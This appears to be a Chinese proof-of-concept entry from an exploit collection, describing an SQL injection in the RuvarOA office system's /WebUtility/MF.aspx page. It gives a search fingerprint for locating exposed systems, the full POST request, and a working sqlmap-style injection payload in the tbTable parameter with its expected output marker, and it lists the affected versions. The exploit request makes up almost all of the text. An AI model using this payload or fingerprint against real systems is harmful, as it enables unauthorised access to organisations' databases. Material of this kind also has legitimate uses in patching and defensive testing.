# RuvarOAMF存在SQL注入漏洞

- **系统**：RuvarOAMF　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="txt_admin_key"`
- **请求**：`POST /WebUtility/MF.aspx HTTP/1.1`
- **关键头**：`Host: \`　`Content-Length: 187`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
__VIEWSTATE=/wEPDwUKMTQzODQ2ODU2NGRkIOnIdBvx8FdC98ZQVziWZAsTeOJOxTvwmwGbcAdrOUw=&tbTable=1%27+AND+8519+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%288519%3D8519%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29+AND+%27tGms%27%3D%27tGms&tbPageID=1&btnMake=%E7%94%9F%E6%88%90%E8%AF%AD%E5%8F%A5&tbSql=
qvjxq1qkqqq
sqlmap
POST /WebUtility/MF.aspx HTTP/1.1
Host:
Content-Length: 187
Content-Type: application/x-www-form-urlencoded
__VIEWSTATE=/…（脚本共 740 字，完整版见原文）
```

**其他**
- RuvarOA MF存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * RuvarOA v6.01
* RuvarOA v12.01